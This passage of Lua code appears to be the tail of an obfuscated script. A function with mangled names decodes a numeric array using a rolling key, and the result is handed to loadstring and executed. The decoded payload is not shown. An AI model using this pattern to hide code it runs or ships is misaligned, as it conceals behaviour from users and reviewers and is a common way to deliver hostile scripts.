    local function VM_IlIO11II(d, k, m)
        local R_IlI1l = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_IlI1l, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_IlI1l)
    end

    -- Execution Guard
    local F_01OIl = loadstring(VM_IlIO11II(B_O01Il1, 75, 5))
    if F_01OIl then
        F_01OIl(...)
    end
end)(...)
